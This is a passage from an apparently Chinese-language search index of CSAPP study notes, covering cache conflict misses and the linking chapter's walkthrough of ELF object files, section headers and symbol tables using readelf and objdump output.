<li>\u4e0e\u76f4\u63a5\u6620\u5c04\u4e0d\u540c\uff0c\u7ec4\u76f8\u8fde cache \u7684\u6bcf\u4e2a set \u5141\u8bb8\u5305\u542b\u591a\u4e2a cache line</li> <li>\u6574\u4e2a cache \u53ea\u6709\u4e00\u4e2a set \u7684\u7f13\u5b58\u79f0\u4e3a\u5168\u76f8\u8fde cache\uff0c\u5177\u4f53\u884c\u6570 <code>E = C/B</code><ul> <li>\u7531\u4e8e\u5168\u76f8\u8fde cache \u53ea\u6709\u4e00\u4e2a set \uff0c\u5176\u4e0d\u518d\u9700\u8981\u7ec4\u7d22\u5f15\u4f4d\u8fdb\u884c\u9009\u62e9</li> <li>\u5168\u76f8\u8fde cache \u53ea\u9002\u5408\u505a\u5bb9\u91cf\u8f83\u5c0f\u7684\u9ad8\u901f\u7f13\u5b58</li> </ul> </li> </ul> <p>\u4e8b\u5b9e\u4e0a\uff0c\u5728\u76f4\u63a5\u6620\u5c04 cache \u4e2d\u7ecf\u5e38\u53d1\u751f\u4e00\u79cd\u540d\u53eb \u51b2\u7a81\u4e0d\u547d\u4e2d \u7684\u73b0\u8c61\uff0c\u5373\u901a\u8fc7\u4ea4\u66ff\u5f15\u7528\u53cd\u590d\u66f4\u65b0\u67d0\u4e00 cache line \uff0c\u5bfc\u81f4\u6027\u80fd\u5947\u5999\u5730\u4e0b\u964d</p> <p>\u63a5\u4e0b\u6765\uff0c\u4e3e\u4e00\u4e2a\u6709\u7740\u826f\u597d\u7684\u5c40\u90e8\u6027\uff0c\u5f53\u65f6\u4f1a\u53d1\u751f\u51b2\u7a81\u4e0d\u547d\u4e2d\u7684\u4ee3\u7801\u4f8b\u5b50\uff1a</p> <pre><code>float dotprod(float x[8], float y[8]){\n    float sum = 0.0;\n    int i = 0;\n    for(i=0;i&lt;8;i++)\n        sum += x[i]*y[i];\n    return sum;\n}\n</code></pre> <p>\u5047\u8bbe\u6570\u7ec4 x \u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u4f4d\u4e8e\u5730\u5740 0 \u5904\uff0c\u4e14 y \u6570\u7ec4\u5728\u5730\u5740\u4e0a\u7d27\u63a5 x \u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u540e\u9762\uff0c\u90a3\u4e48\u8be5\u7a0b\u5e8f\u5730\u5740\u5206\u914d\u5982\u4e0b\uff1a</p> <p></p> <p>\u53d6\u6781\u7aef\u4f8b\u5b50\uff0c\u9009\u62e9\u4e00\u4e2a\u53ea\u6709\u4e24\u4e2a set \u7684 \u76f4\u63a5\u6620\u5c04 cache\uff0c\u5176\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>+---------+---------+------------+\n|1 bit Tag|1 bit Set|4 bit Offset| Address\n+---------+---------+------------+\n</code></pre> <p>\u7531\u4e8e <code>32 = 10 0000</code> \uff0c<code>y[0]</code> \u5f00\u59cb\u7684\u6570\u636e\u7684 Set index \u4e3a <code>0</code> \uff0c\u548c <code>x[0]</code> \u76f8\u540c</p> <p>\u90a3\u4e48\u6bcf\u6b21\u5faa\u73af\uff0c\u90fd\u4f1a\u5148\u8c03\u7528 <code>x[i]</code> \uff0c\u518d\u8c03\u7528 <code>y[i]</code> \uff0c\u4e14\u4e8c\u8005\u8c03\u7528\u540c\u4e00\u4e2a cache line\uff0c\u5bfc\u81f4\u6bcf\u6b21\u8bfb\u53d6\u6570\u636e\u90fd\u6709\u7f13\u5b58\u4e0d\u547d\u4e2d (Cache Miss) \uff0c\u8fd9\u79cd\u73b0\u8c61\u4e5f\u88ab\u79f0\u4e3a \u6296\u52a8 \uff0c\u8fd9\u79cd\u6296\u52a8\u7684\u51fa\u73b0\u53ef\u80fd\u4f1a\u5bfc\u81f4\u8fd0\u884c\u901f\u5ea6\u4e0b\u964d2\u52303\u500d</p> <p>\u4e0d\u8fc7\uff0c\u5982\u679c\u7a0b\u5e8f\u4e91\u610f\u8bc6\u5230\u8fd9\u79cd\u6296\u52a8\u7684\u5b58\u5728\uff0c\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u5185\u5b58\u5206\u914d\u60c5\u51b5\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u4f8b\u5982\u6b64\u9898\uff0c\u53ef\u4ee5\u628a\u6570\u7ec4 x \u7684\u957f\u5ea6\u7531 8 \u53d8\u6210 12\uff0c\u4f7f\u5f97\u6570\u7ec4 y \u7684 Set index \u4e0e x \u5b8c\u5168\u9519\u5f00\uff1a</p> <p></p> <p>Intel Core i7 Cache Hierarchy</p> <p></p>"},{"location":"Accumulation/CSAPP/Chapter7/","title":"CH 7. \u94fe\u63a5","text":""},{"location":"Accumulation/CSAPP/Chapter7/#chapter-7-linking","title":"Chapter 7. Linking","text":"<p> \u7ea6 7051 \u4e2a\u5b57  132 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 37 \u5206\u949f</p> <p>\u94fe\u63a5\u662f\u5c06\u5404\u79cd\u4ee3\u7801\u548c\u6570\u636e\u6536\u96c6\u5e76\u7ec4\u5408\u6210\u4e00\u4e2a\u6587\u4ef6\u7684\u8fc7\u7a0b</p>"},{"location":"Accumulation/CSAPP/Chapter7/#_1","title":"\u7f16\u8bd1\u5668\u9a71\u52a8\u7a0b\u5e8f\u793a\u4f8b","text":"<p>\u6784\u9020\u5927\u578b\u7a0b\u5e8f\u65f6\u7ecf\u5e38\u6709\u7f3a\u5c11\u5e93\u6587\u4ef6\u6216\u8005\u5e93\u6587\u4ef6\u7684\u7248\u672c\u4e0d\u517c\u5bb9\u800c\u5bfc\u81f4\u7684\u94fe\u63a5\u9519\u8bef\uff0c\u89e3\u51b3\u8fd9\u7c7b\u95ee\u9898\u9700\u8981\u7406\u89e3\u94fe\u63a5\u5668\u662f\u5982\u4f55\u4f7f\u7528\u5e93\u6587\u4ef6\u6765\u89e3\u6790\u5f15\u7528\u7684\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u5b66\u4e60\u94fe\u63a5\u8fd8\u53ef\u4ee5\u5e2e\u52a9\u7406\u89e3\u7f16\u7a0b\u8bed\u8a00\u4e2d\u7684\u4f5c\u7528\u57df\u89c4\u5219\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u3002</p> <pre><code> &gt; nano main.c\n 1 int sum(int *a, int n);\n 2\n 3 int array[2] = {1,2};\n 4\n 5 int main(){\n 6         int val = sum(array,2);\n 7         return val;\n 8 }\n &gt; nano sum.c\n 1 int sum(int *a, int n){\n 2         int i,s = 0;\n 3         for(i=0;i&lt;n;i++)\n 4                 s+=a[i];\n 5         return s;\n 6 }\n &gt; gcc -Og main.c sum.c -o prog\n# \u4f7f\u7528\u6b64\u6307\u4ee4\u5f97\u5230\u53ef\u6267\u884c\u7a0b\u5e8f prog\n</code></pre> <p>\u5173\u4e8e\u8be5\u7a0b\u5e8f\u7684\u5355\u72ec\u7f16\u8bd1\u8fc7\u7a0b\uff0c\u6b64\u5904\u4e0d\u518d\u590d\u5236\uff0c\u8bf7\u67e5\u770b Chapter 1. \u8ba1\u7b97\u673a\u7cfb\u7edf\u6f2b\u6e38</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f53\u6211\u4eec\u624b\u52a8\u8c03\u7528\u94fe\u63a5\u5668\u6765\u6784\u9020\u53ef\u6267\u884c\u7a0b\u5e8f\u65f6\uff0c\u9664\u4e86\u9700\u8981\u7528\u5230\u6c47\u7f16\u9636\u6bb5\u751f\u6210\u7684 <code>main.o</code> \u548c <code>sum.o</code> \u5916\uff0c\u8fd8\u9700\u8981 <code>crt1.o</code>,<code>crti.o</code>,<code>crtbeginT.o</code>,<code>crtend.o</code>,<code>crtn.o</code>\uff0c\u5176\u4e2d\uff0c<code>crt</code> \u662f c runtime \u7684\u7f29\u5199</p>"},{"location":"Accumulation/CSAPP/Chapter7/#_2","title":"\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6","text":"<p>\u63a5\u4e0b\u6765\u6211\u4eec\u4f7f\u7528\u5982\u4e0bC\u8bed\u8a00\u7a0b\u5e8f\u6765\u6f14\u793a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\uff1a</p> <pre><code>#include&lt;stdio.h&gt;\n\nint count = 10;\nint value;\n\nvoid func(int sum){\n    printf(\"sum is: %d\\n\",sum);\n}\n\nint main(){\n    static int a = 1;\n    static int b = 0;\n    int x = 1;\n    func(a+b+x);\n    return 0;\n}\n</code></pre> <p>\u4f7f\u7528\u547d\u4ee4 <code>gcc -c main.c</code> \u5c06\u8fd9\u4e2a\u6e90\u6587\u4ef6 <code>main.c</code> \u7ffb\u8bd1\u6210\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6 <code>main.o</code> \uff0c\u5176\u4e2d\u7f16\u8bd1\u9009\u9879 <code>-c</code> \u8868\u793a\u53ea\u8fdb\u884c\u7f16\u8bd1\u548c\u6c47\u7f16\uff0c\u4e0d\u6267\u884c\u94fe\u63a5\u64cd\u4f5c</p> <p>\u6bcf\u4e00\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u53ef\u4ee5\u5927\u81f4\u5206\u4e3a\u4e09\u90e8\u5206\uff0c\u5206\u522b\u662f <code>ELF header</code>,\u4e0d\u540c\u7684<code>Sections</code>,\u4ee5\u53ca\u63cf\u8ff0\u8fd9\u4e9b<code>section</code>\u4fe1\u606f\u7684\u8868(<code>Section header table</code>)</p> <p>ELF : Executable and Linkable Format(\u53ef\u6267\u884c\u53ef\u94fe\u63a5\u683c\u5f0f)</p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>readelf -h main.o</code> \u6765\u67e5\u770b <code>ELF header</code> \u7684\u5177\u4f53\u5185\u5bb9\uff0c\u5176\u4e2d <code>-h</code> \u9009\u9879\u8868\u793a\u53ea\u663e\u793a header \u4fe1\u606f\uff1a</p> <pre><code>\u276f readelf -h main.o\nELF \u5934\uff1a\n  Magic\uff1a   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00\n  \u7c7b\u522b:                              ELF64\n  \u6570\u636e:                              2 \u8865\u7801\uff0c\u5c0f\u7aef\u5e8f (little endian)\n  Version:                           1 (current)\n  OS/ABI:                            UNIX - System V\n  ABI \u7248\u672c:                          0\n  \u7c7b\u578b:                              REL (\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6)\n  \u7cfb\u7edf\u67b6\u6784:                          Advanced Micro Devices X86-64\n  \u7248\u672c:                              0x1\n  \u5165\u53e3\u70b9\u5730\u5740\uff1a               0x0\n  \u7a0b\u5e8f\u5934\u8d77\u70b9\uff1a          0 (bytes into file)\n  Start of section headers:          992 (bytes into file)\n  \u6807\u5fd7\uff1a             0x0\n  Size of this header:               64 (bytes)\n  Size of program headers:           0 (bytes)\n  Number of program headers:         0\n  Size of section headers:           64 (bytes)\n  Number of section headers:         14\n  Section header string table index: 13\n</code></pre> <p>\u9996\u5148\u5206\u6790 ELF Header \u4e2d\u6700\u5f00\u59cb\u7684\u5341\u516d\u4f4d\u5b57\u8282 Magic \uff1a</p> <ul> <li>Magic \u6700\u5f00\u59cb\u7684\u56db\u4e2a\u5b57\u7b26 <code>7f 45 4c 46</code> \u662f <code>ELF</code> \u6587\u4ef6\u7684\u9b54\u6570\uff0c\u5206\u522b\u4e0e ASCII \u7801\u4e2d\u7684 DEL \u63a7\u5236\u7b26\u3001\u5b57\u7b26 E \u3001\u5b57\u7b26 L \u4ee5\u53ca\u5b57\u7b26 F \u5bf9\u5e94</li> <li>\u63a5\u4e0b\u6765\u7684\u4e00\u4e2a\u5b57\u8282 <code>02</code> \u7528\u6765\u8868\u793a <code>ELF</code> \u6587\u4ef6\u7c7b\u578b\uff0c<code>0x01</code> \u8868\u793a 32 \u4f4d\uff0c<code>0x02</code> \u8868\u793a 64 \u4f4d</li> <li>\u518d\u4e0b\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u5b57\u8282\u5e8f\uff0c\u5176\u4e2d <code>0x01</code> \u8868\u793a\u5c0f\u7aef\u5e8f\uff0c<code>0x02</code> \u8868\u793a\u5927\u7aef\u5e8f</li> <li>\u7b2c\u4e03\u4e2a\u5b57\u8282\u8868\u793a ELF \u6587\u4ef6\u7684\u7248\u672c\u53f7\uff0c\u901a\u5e38\u90fd\u662f <code>0x01</code></li> <li>\u6700\u540e\u4e5d\u4e2a\u5b57\u8282 ELF \u7684\u6807\u51c6\u4e2d\u6ca1\u6709\u5b9a\u4e49\uff0c\u7528 <code>0x00</code> \u586b\u5145</li> </ul> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u9700\u6ce8\u610f\u7684\u6709\u8be5 ELF \u6587\u4ef6\u7684 type \u4f4d REL (Relocation File) \uff0c\u9664\u4e86 REL \u5916\uff0c\u8fd8\u6709\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u6587\u4ef6\u4e24\u79cd\u7c7b\u578b\uff1b<code>Size of this header</code> \u884c\u7ed9\u51fa\u4e86 Header \u7684\u957f\u5ea6\uff0c\u636e\u6b64\u53ef\u77e5 sections \u5728\u8be5 ELF \u6587\u4ef6\u7684\u8d77\u59cb\u4f4d\u7f6e\u4e3a <code>0x40</code> \uff1b<code>Start of section headers</code> \u7ed9\u51fa\u4e86 section headers \u7684\u8d77\u59cb\u5730\u5740</p> <p>\u63a5\u7740\u4f7f\u7528\u547d\u4ee4 <code>readelf -S main.o</code> \u6765\u67e5\u770b Section header (\u5927\u5199 S):</p> <pre><code>\u276f readelf -S main.o\nThere are 14 section headers, starting at offset 0x3e0:\n\nSection header\uff1a\n  [Nr] Name              Type             Address            Offset\n       Size              Entsize          Flags  Link  Info  Align\n  [ 0]                   NULL             0000000000000000  00000000\n       0000000000000000  0000000000000000           0     0     0\n  [ 1] .text             PROGBITS         0000000000000000  00000040\n       000000000000005f  0000000000000000  AX       0     0     1\n  [ 2] .rela.text        RELA             0000000000000000  000002c0\n       0000000000000078  0000000000000018   I      11     1     8\n  [ 3] .data             PROGBITS         0000000000000000  000000a0\n       0000000000000008  0000000000000000  WA       0     0     4\n  [ 4] .bss              NOBITS           0000000000000000  000000a8\n       0000000000000008  0000000000000000  WA       0     0     4\n  [ 5] .rodata           PROGBITS         0000000000000000  000000a8\n       000000000000000c  0000000000000000   A       0     0     1\n  [ 6] .comment          PROGBITS         0000000000000000  000000b4\n       0000000000000027  0000000000000001  MS       0     0     1\n  [ 7] .note.GNU-stack   PROGBITS         0000000000000000  000000db\n       0000000000000000  0000000000000000           0     0     1\n  [ 8] .note.gnu.pr[...] NOTE             0000000000000000  000000e0\n       0000000000000020  0000000000000000   A       0     0     8\n  [ 9] .eh_frame         PROGBITS         0000000000000000  00000100\n       0000000000000058  0000000000000000   A       0     0     8\n  [10] .rela.eh_frame    RELA             0000000000000000  00000338\n       0000000000000030  0000000000000018   I      11     9     8\n  [11] .symtab           SYMTAB           0000000000000000  00000158\n       0000000000000138  0000000000000018          12     8     8\n  [12] .strtab           STRTAB           0000000000000000  00000290\n       000000000000002d  0000000000000000           0     0     1\n  [13] .shstrtab         STRTAB           0000000000000000  00000368\n       0000000000000074  0000000000000000           0     0     1\nKey to Flags:\n  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),\n  L (link order), O (extra OS processing required), G (group), T (TLS),\n  C (compressed), x (unknown), o (OS specific), E (exclude),\n  D (mbind), l (large), p (processor specific)\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u9664\u4e86 <code>[0]</code> \uff0c\u5176\u5b83\u6bcf\u4e00\u4e2a\u8868\u9879\u5bf9\u5e94\u7740\u4e00\u4e2a Section \uff0c\u6574\u4e2a ELF \u6587\u4ef6\u5171\u6709 13 \u4e2a Section \u3002\u5176\u4e2d <code>Offset</code> \u8868\u793a\u6bcf\u4e2a Section \u7684\u8d77\u59cb\u4f4d\u7f6e\uff0c<code>Size</code> \u8868\u793a Section \u7684\u5927\u5c0f</p> <p>\u4f8b\u5982\uff0c<code>.text section</code> \u8d77\u59cb\u4f4d\u7f6e\u4e3a <code>0x40</code> \u7d27\u8ddf\u5728 <code>ELF header</code> \u4e4b\u540e\uff0csection \u4e2d\u5b58\u653e\u7740\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u673a\u5668\u4ee3\u7801\uff0c\u9700\u8981\u4f7f\u7528 <code>objdump</code> \u8f6c\u4e3a\u6c47\u7f16\u4ee3\u7801\u8fdb\u884c\u67e5\u770b\uff1a</p> <pre><code>\u276f objdump -s -d main.o\n\nmain.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n\nContents of section .text:\n 0000 f30f1efa 554889e5 4883ec10 897dfc8b  ....UH..H....}..\n 0010 45fc89c6 488d0500 00000048 89c7b800  E...H......H....\n 0020 000000e8 00000000 90c9c3f3 0f1efa55  ...............U\n 0030 4889e548 83ec10c7 45fc0100 00008b15  H..H....E.......\n 0040 00000000 8b050000 000001c2 8b45fc01  .............E..\n 0050 d089c7e8 00000000 b8000000 00c9c3    ...............\nContents of section .data:\n 0000 0a000000 01000000                    ........\nContents of section .rodata:\n 0000 73756d20 69733a20 25640a00           sum is: %d..\nContents of section .comment:\n 0000 00474343 3a202855 62756e74 75203133  .GCC: (Ubuntu 13\n 0010 2e322e30 2d323375 62756e74 75342920  .2.0-23ubuntu4)\n 0020 31332e32 2e3000                      13.2.0.\nContents of section .note.gnu.property:\n 0000 04000000 10000000 05000000 474e5500  ............GNU.\n 0010 020000c0 04000000 03000000 00000000  ................\nContents of section .eh_frame:\n 0000 14000000 00000000 017a5200 01781001  .........zR..x..\n 0010 1b0c0708 90010000 1c000000 1c000000  ................\n 0020 00000000 2b000000 00450e10 8602430d  ....+....E....C.\n 0030 06620c07 08000000 1c000000 3c000000  .b..........&lt;...\n 0040 00000000 34000000 00450e10 8602430d  ....4....E....C.\n 0050 066b0c07 08000000                    .k......\n\nDisassembly of section .text:\n\n0000000000000000 &lt;func&gt;:\n   0:   f3 0f 1e fa             endbr64\n   4:   55                      push   %rbp\n   5:   48 89 e5                mov    %rsp,%rbp\n   8:   48 83 ec 10             sub    $0x10,%rsp\n   c:   89 7d fc                mov    %edi,-0x4(%rbp)\n   f:   8b 45 fc                mov    -0x4(%rbp),%eax\n  12:   89 c6                   mov    %eax,%esi\n  14:   48 8d 05 00 00 00 00    lea    0x0(%rip),%rax        # 1b &lt;func+0x1b&gt;\n  1b:   48 89 c7                mov    %rax,%rdi\n  1e:   b8 00 00 00 00          mov    $0x0,%eax\n  23:   e8 00 00 00 00          call   28 &lt;func+0x28&gt;\n  28:   90                      nop\n  29:   c9                      leave\n  2a:   c3                      ret\n\n000000000000002b &lt;main&gt;:\n  2b:   f3 0f 1e fa             endbr64\n  2f:   55                      push   %rbp\n  30:   48 89 e5                mov    %rsp,%rbp\n  33:   48 83 ec 10             sub    $0x10,%rsp\n  37:   c7 45 fc 01 00 00 00    movl   $0x1,-0x4(%rbp)\n  3e:   8b 15 00 00 00 00       mov    0x0(%rip),%edx        # 44 &lt;main+0x19&gt;\n  44:   8b 05 00 00 00 00       mov    0x0(%rip),%eax        # 4a &lt;main+0x1f&gt;\n  4a:   01 c2                   add    %eax,%edx\n  4c:   8b 45 fc                mov    -0x4(%rbp),%eax\n  4f:   01 d0                   add    %edx,%eax\n  51:   89 c7                   mov    %eax,%edi\n  53:   e8 00 00 00 00          call   58 &lt;main+0x2d&gt;\n  58:   b8 00 00 00 00          mov    $0x0,%eax\n  5d:   c9                      leave\n  5e:   c3                      ret\n</code></pre> <p><code>.data</code> \u7528\u6765\u5b58\u653e\u5df2\u521d\u59cb\u5316\u4e14\u975e\u96f6\u7684\u5168\u5c40\u53d8\u91cf\u548c\u9759\u6001\u53d8\u91cf\u7684\u503c\uff1b\u9664\u5c40\u90e8\u53d8\u91cf\u5916\u5176\u5b83\u53d8\u91cf\u90fd\u5b58\u653e\u5728 <code>.bss</code> \u4e2d</p> <p>\u56de\u5230\u4e0a\u9762\u7684 Section header \uff0c\u53ef\u4ee5\u770b\u5230 <code>.bss</code> \u7684\u521d\u59cb\u4f4d\u7f6e\u4e0e <code>.rodata</code> \u76f8\u540c\u3002\u5b9e\u9645\u4e0a\uff0c <code>.bss</code> \u5e76\u4e0d\u5360\u636e\u5b9e\u9645\u7a7a\u95f4\uff0c\u5b83\u4ec5\u4ec5\u662f\u4e00\u4e2a\u5360\u4f4d\u7b26\uff0c\u533a\u5206\u5df2\u521d\u59cb\u5316\u548c\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf\u662f\u4e3a\u4e86\u8282\u7701\u7a7a\u95f4\uff0c\u5f53\u7a0b\u5e8f\u8fd0\u884c\u65f6\uff0c\u4f1a\u5728\u5185\u5b58\u4e2d\u5206\u914d\u8fd9\u4e9b\u53d8\u91cf\uff0c\u5e76\u628a\u521d\u59cb\u503c\u8bbe\u4e3a 0</p> Section Introduction .comment \u5b58\u653e\u7f16\u8bd1\u5668\u7248\u672c\u4fe1\u606f .symtab Symbol Table \uff0c\u7b26\u53f7\u8868 .rel.text Relocation Table \uff0c\u91cd\u5b9a\u4f4d\u8868 .debug \u8c03\u8bd5\u4fe1\u606f .line \u539f\u59cb C \u7a0b\u5e8f\u884c\u53f7\u548c .text section \u4e2d\u673a\u5668\u6307\u4ee4\u7684\u6620\u5c04 .strtab String Table \uff0c\u5b57\u7b26\u4e32\u8868"},{"location":"Accumulation/CSAPP/Chapter7/#_3","title":"\u7b26\u53f7\u4e0e\u7b26\u53f7\u8868","text":"<p>\u8981\u6b63\u786e\u6267\u884c\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u4e4b\u95f4\u7684\u94fe\u63a5\uff0c\u9700\u8981 <code>.symtab</code> \u4e2d\u7684\u7b26\u53f7\u4f5c\u4e3a\u7c98\u5408\u624d\u884c\u3002</p> <p>\u4f7f\u7528\u547d\u4ee4 <code>readelf -s main.o</code> \u67e5\u770b\u7b26\u53f7\u8868\u7684\u5185\u5bb9 (\u5c0f\u5199 s) \uff1a</p> <pre><code>\u276f readelf -s main.o\n\nSymbol table '.symtab' contains 13 entries:\n   Num:    Value          Size Type    Bind   Vis      Ndx Name\n     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND\n     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS main.c\n     2: 0000000000000000     0 SECTION LOCAL  DEFAULT    1 .text\n     3: 0000000000000000     0 SECTION LOCAL  DEFAULT    3 .data\n     4: 0000000000000000     0 SECTION LOCAL  DEFAULT    4 .bss\n     5: 0000000000000000     0 SECTION LOCAL  DEFAULT    5 .rodata\n     6: 0000000000000004     4 OBJECT  LOCAL  DEFAULT    3 a.1\n     7: 0000000000000004     4 OBJECT  LOCAL  DEFAULT    4 b.0\n     8: 0000000000000000     4 OBJECT  GLOBAL DEFAULT    3 count\n     9: 0000000000000000     4 OBJECT  GLOBAL DEFAULT    4 value\n    10: 0000000000000000    43 FUNC    GLOBAL DEFAULT    1 func\n    11: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND printf\n    12: 000000000000002b    52 FUNC    GLOBAL DEFAULT    1 main\n</code></pre> <p>\u9996\u5148\uff0c\u6211\u4eec\u5148\u89e3\u6790\u4e00\u4e0b\u7b26\u53f7 <code>main</code> \u548c <code>func</code> : </p> <ul> <li>\u5728\u6e90\u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u4e86\u51fd\u6570 <code>main</code> \u548c\u51fd\u6570 <code>func</code> \uff0c\u6240\u4ee5\u7b26\u53f7\u8868\u4e2d\u4e8c\u8005\u7684 Type \u4e3a <code>FUNC</code> \uff1b\u7531\u4e8e\u5b83\u4eec\u540c\u65f6\u662f\u5168\u5c40\u53ef\u89c1\u7684\uff0c\u56e0\u6b64\u8fd9\u91cc\u7684 <code>Binding</code> \u5b57\u6bb5\u4e5f\u662f <code>GLOBAL</code> </li> <li><code>Ndx</code> \u4e3a section \u7684\u7d22\u5f15\u503c\uff0c\u53ef\u4ee5\u67e5\u770b section header table \u6765\u786e\u5b9a<ul> <li>\u4f8b\u5982\uff0c\u6211\u4eec\u77e5\u9053\u51fd\u6570 <code>main</code> \u548c <code>func</code> \u4f4d\u4e8e <code>.text</code> \u4e2d\uff0c\u6240\u4ee5\u5b83\u4eec\u7684 <code>Ndx</code> \u4e3a 1</li> </ul> </li> <li><code>Value</code> \u8868\u793a\u8be5\u7b26\u53f7\u76f8\u5bf9\u4e8e\u5176\u5bf9\u5e94 section \u8d77\u59cb\u4f4d\u7f6e\u7684\u504f\u79fb\u91cf</li> <li><code>Size</code> \u8868\u793a\u6240\u5360\u5b57\u8282\u6570\uff0c\u6240\u4ee5\u6709 <code>main</code> \u7684 <code>Value</code> \u7b49\u4e8e <code>func</code> \u7684 <code>Size</code></li> <li>\u5b57\u6bb5 <code>Vis</code> \u5728 C \u8bed\u8a00\u4e2d\u5e76\u672a\u4f7f\u7528\uff0c\u56e0\u6b64\u5ffd\u7565</li> </ul> <p>\u5173\u4e8e\u7b26\u53f7 <code>printf</code> \uff0c\u867d\u7136\u5b83\u4e5f\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u4f46\u662f\u5176\u5728 <code>main.c</code> \u4e2d\u5e76\u672a\u5b9a\u4e49\uff0c\u6240\u4ee5\u5b83\u7684 <code>Ndx</code> \u662f <code>UND</code> (undefine) </p> <p>\u63a5\u4e0b\u6765\u89e3\u6790\u5168\u5c40\u53d8\u91cf\u5bf9\u5e94\u7684\u7b26\u53f7 <code>count</code> \u548c <code>value</code> :</p> <ul> <li>\u5176 <code>Type</code> \u5747\u4e3a <code>OBJECT</code> \uff0c\u8868\u660e\u8be5\u7b26\u53f7\u662f\u6570\u636e\u5bf9\u8c61\u3002\u53d8\u91cf\u548c\u6570\u7ec4\u5728\u7b26\u53f7\u8868\u4e2d\u7684\u7c7b\u578b\u5747\u4e3a <code>OBJECT</code></li> <li>\u4e8c\u8005 <code>Ndx</code> \u4e0d\u540c\uff0c\u8bf4\u660e\u5b83\u4eec\u5904\u4e8e\u4e0d\u540c\u7684 section \u4e2d\uff0c\u8fd9\u4e00\u70b9\u5728\u4e0a\u4e00\u8282\u4e5f\u6709\u8bf4\u660e<ul> <li><code>count</code> \u6709\u521d\u59cb\u5316\uff0c\u4f4d\u4e8e <code>.data</code> \u4e2d\uff1b<code>value</code> \u6ca1\u6709\u521d\u59cb\u5316\uff0c\u4f4d\u4e8e <code>.bss</code> \u4e2d</li> </ul> </li> </ul> <p>\u4e0e\u4e4b\u7c7b\u4f3c\uff0c\u5bf9\u4e8e\u7b26\u53f7 <code>a</code> \u548c <code>b</code> :</p> <ul> <li>\u5c40\u90e8\u9759\u6001\u53d8\u91cf <code>a</code> \u8fdb\u884c\u4e86\u521d\u59cb\u5316\uff0c\u6240\u4ee5\u5176 <code>Ndx</code> \u4e3a 3</li> <li>\u5c40\u90e8\u9759\u6001\u53d8\u91cf <code>b</code> \u4e5f\u8fdb\u884c\u4e86\u521d\u59cb\u5316\uff0c\u4f46\u662f\u5176\u521d\u59cb\u5316\u503c\u4e3a 0 \uff0c\u6240\u4ee5\u5176\u4f4d\u4e8e <code>.bss</code> \u4e2d</li> <li>\u4e8c\u8005\u7684\u540e\u7f00 <code>a.1</code> , <code>b.0</code> \u4e3a\u540d\u79f0\u4fee\u9970\uff0c\u4f5c\u7528\u4e3a\u9632\u6b62\u9759\u6001\u53d8\u91cf\u9759\u6001\u53d8\u91cf\u540d\u5b57\u51b2\u7a81</li> </ul> <p>\u6709\u65f6\u7b26\u53f7\u8868\u4e2d\u6709\u7b26\u53f7\u540d\u4e3a\u7a7a\uff0c\u5b83\u4eec\u7684\u7b26\u53f7\u540d\u5c31\u662f\u5bf9\u5e94 section \u7684\u540d\u79f0</p> <p>\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 <code>main</code> \u51fd\u6570\u4e2d\u7684\u5c40\u90e8\u53d8\u91cf <code>x</code> \u5e76\u6ca1\u6709\u51fa\u73b0\u5728\u7b26\u53f7\u8868\u4e2d\uff0c\u8fd9\u662f\u56e0\u4e3a\u5c40\u90e8\u53d8\u91cf\u5728\u8fd0\u884c\u4e2d\u5728\u6808\u4e2d\u7ba1\u7406\uff0c\u94fe\u63a5\u5668\u4e0d\u7ba1\u7406\u6b64\u7c7b\u7b26\u53f7\uff0c\u6240\u4ee5\u5c40\u90e8\u53d8\u91cf\u4e0d\u4f1a\u51fa\u73b0\u5728\u7b26\u53f7\u8868\u4e2d</p> <p>\u6bcf\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u7b26\u53f7\u8868\uff0c\u5305\u542b\u8be5\u6a21\u5757\u5b9a\u4e49\u548c\u5f15\u7528\u7684\u7b26\u53f7\u4fe1\u606f\uff0c\u5728\u94fe\u63a5\u5668\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u6709\u4e09\u79cd\u4e0d\u540c\u7684\u7b26\u53f7\uff1a</p> <ul> <li>(1) \u7531\u8be5\u6a21\u5757\u5b9a\u4e49\uff0c\u540c\u65f6\u80fd\u88ab\u5176\u5b83\u6a21\u5757\u5f15\u7528\u7684\u5168\u5c40\u7b26\u53f7 Global Symbols<ul> <li>\u4f8b\u5982\uff0c<code>main.c</code> \u4e2d\u7684\u51fd\u6570 <code>func</code> \u4ee5\u53ca\u5168\u5c40\u53d8\u91cf <code>count</code> \u548c <code>value</code></li> </ul> </li> <li>(2) 